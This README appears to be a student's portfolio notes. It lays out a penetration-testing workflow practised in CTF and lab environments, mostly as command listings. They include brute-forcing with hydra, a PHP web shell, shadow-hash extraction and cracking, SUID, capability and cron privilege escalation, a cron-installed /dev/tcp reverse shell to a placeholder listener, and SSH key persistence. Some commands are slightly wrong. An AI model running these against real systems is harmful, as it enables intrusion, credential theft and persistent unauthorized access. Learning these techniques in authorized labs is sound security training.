# Systematic-workflow-for-pen-testing

My experience summary and documentation for hands-on techniques and tools, enumeration workflows,vulenrability reaserch, exloitation and privilege escalation methods practiced in CTF challenges as well as practical labs, which summarizes most aspects of the kill chain process.

> **TryHackMe Profile**: Top 8% https://tryhackme.com/p/WIZ.ZERO


> **Environment**: All activities performed in authorized, isolated labs (TryHackMe, VulnHub, Hack The Box Starting Point). No external systems targeted.

---

## 🔍 1. Reconnaissance & Enumeration

I follow a repeatable, layered enumeration process to minimize missed vectors and build a complete attack surface map.

### Network & Service Discovery
```bash
# Full-port scan with default scripts and version detection
nmap -sC -sV -p- --min-rate=1000 -T4 <target>

# Directory brute-forcing with custom wordlist
gobuster dir -u http://<target> -w /wiz/Documents/wordlists/commondir.txt -x php,html,txt

# Automated web scanner
nikto -h http://<target>

# Manual inspection & request manipulation
# → BurpSuite used to test for IDOR, auth bypass, and misconfigurations

smbclient -L \\\\<target>\\ -N          # List shares anonymously
enum4linux -a <target>                 # Full SMB enumeration

# Extract metadata from images (CTF steganography / real-world leaks)
exiftool image.png
# Reveals: GPS coordinates, camera model, software, timestamps
# Cross-referenced with Wigle.net for Wi-Fi geolocation in advanced challenges

# Username enumeration across platforms
sherlock username
# Identifies associated social media accounts—useful for credential stuffing or phishing simulation (in authorized scope)

```
💥 2. Exploitation (Initial Access)

```bash

# Online brute-forcing (SSH, FTP, HTTP forms ...)
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target> ssh -V
hydra -L users.txt -P passwords.txt <target> http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# Automated SQL injection
sqlmap -u "http://<target>/page?id=1" --dump --batch

# Manual RCE via command injection or file upload
# → Uploaded PHP reverse shell after bypassing extension filters
<?php system($_REQUEST['cmd']); ?>

# Extracting hashes from compromised systems
grep -oE '[a-f0-9]{32}' /etc/passwd.backup       # MD5
grep -oE '\$[0-9]\$\S+' /etc/shadow             # SHA-512 (Linux)
strings memory.dmp | grep -E '^[A-Za-z0-9+/]{20,}={0,2}$'  # Base64 clues

# Cracking with Hashcat and john
./john --format=nt hash.txt --wordlist=rockyou.txt (can specify format to protected zip files, ssh keys ...)
hashcat -m 0   hash.txt /usr/share/wordlists/rockyou.txt   # MD5
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt # SHA-512

# Cipher decryption (CTF-focused)
# → Identified ROT13, Base64, XOR, Caesar via frequency analysis
echo "SGVsbG8gd29ybGQh" | base64 -d
echo "uryyb jbeyq" | tr 'a-z' 'n-za-m'  # ROT13

# Used CyberChef (offline/local) for multi-step decoding chains (e.g., Base64 → ROT13 → XOR)

#Binwalk and steghide for hidden messages in images
Steghide image.png /extract
binwalk image.png (-e option to extract)
```
⛓️ 3. Privilege Escalation

Escalating from initial low-privilege access to full system control.

Linux Privilege Escalation Vectors

```bash
# SUID binaries (GTFOBins-based exploitation)
find / -type f -perm -4000 2>/dev/null
find . -exec /bin/sh \; -quit

# Capabilities
getcap -r / 2>/dev/null
# Example: /usr/bin/python3 = cap_setuid+ep
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Cron jobs & writable scripts
ls -la /etc/cron.d/
echo "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash" > /etc/cron.d/payload

# Kernel exploits (lab-only)
# → Exploited CVE-2021-4034 (PwnKit) and legacy Dirty COW in intentionally vulnerable VMs

# Sudo misconfigurations
sudo -l  # Revealed NOPASSWD entries
sudo /bin/bash  # Direct root shell

```
Additional Automated Enumeration Post-Access using linpeas

```bash
wget http://<local>/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh

# We can also you the command scp in order to transfer the tool file remotly
```
🎯 4. Post-Exploitation & Objective Completion
Maintaining access, proving impact, and fulfilling engagement goals.

Shell Stabilization

```bash

python3 -c 'import pty; pty.spawn("/bin/bash")'
# → Ctrl+Z → stty raw -echo; fg → reset → export TERM=xterm

# Cron-based reverse shell
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1") | crontab -
```
Persistence Mechanisms
```bash
# SSH key injection
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2E... wizard@kali" >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys
```
Listener Setup

```bash
# Netcat 
nc -nvlp 4444
```
Goals Achieved in Labs/CTFs

1 gain root privilegs through web exploitaion and privilege escalation → Full system compromise

2 Dump and crack /etc/shadow → Credential reuse demonstration

3 Extract database contents via SQLi → Data exfiltration risk

4 Pivot to internal machines using reused SSH keys → Lateral movement

5 Decode hidden messages in images (steganography) → CTF flag retrieval








